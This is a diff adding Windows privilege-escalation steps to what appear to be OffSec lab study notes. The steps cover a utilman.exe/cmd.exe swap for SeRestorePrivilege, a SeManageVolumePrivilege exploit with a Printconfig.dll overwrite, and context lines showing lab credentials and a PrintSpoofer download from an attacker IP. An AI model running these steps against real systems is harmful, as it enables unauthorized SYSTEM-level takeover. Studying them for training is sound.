@@ -1057,6 +1057,51 @@ $ python3 ./49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.r
 
 ## Windows Privesc
 
+### Windows Privileges:::
+### SeRestorePrivilege
+1. Rename C:\Windows\System32\utilman.exe to C:\Windows\System32\utilman.old
+```bash
+ren "utilman.exe" "utilman.old"
+```
+2. Rename C:\Windows\System32\cmd.exe to C:\Windows\System32\utilman.exe
+```bash
+ren "cmd.exe" "utilman.exe"
+```
+3. On kali machine, start rdesktop 192.168.216.165
+```bash
+┌──(root㉿kali)-[~/offsec]
+└─# rdesktop 192.168.216.165
+```
+4. When there’s a popup, press window key and “u”
+![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/5be1175e-fc2e-4935-8bc7-6e0cde8d69d3/613346fc-3f4d-4e34-a634-3d2ac9ad0edc/Untitled.png)
+5. We have a system shell!!!
+
+### SeManageVolumePrivilege https://github.com/CsEnox/SeManageVolumeExploit
+```bash
+.\SeManageVolumeExploit.exe
+Entries changed: 923
+DONE 
+
+C:\TEMP>move C:\TEMP\Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll
+move C:\TEMP\Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll
+Overwrite C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll? (Yes/No/All): yes
+yes
+        1 file(s) moved.
+
+C:\TEMP>powershell
+powershell
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\TEMP> $type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
+$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
+PS C:\TEMP> $object = [Activator]::CreateInstance($type)
+$object = [Activator]::CreateInstance($type)
+```
+
+
+
+
 ### Windows Privesc: PrintSpoofer
 ```bash
 iwr -uri http://192.168.45.176/PrintSpoofer64.exe -Outfile PrintSpoofer.exe
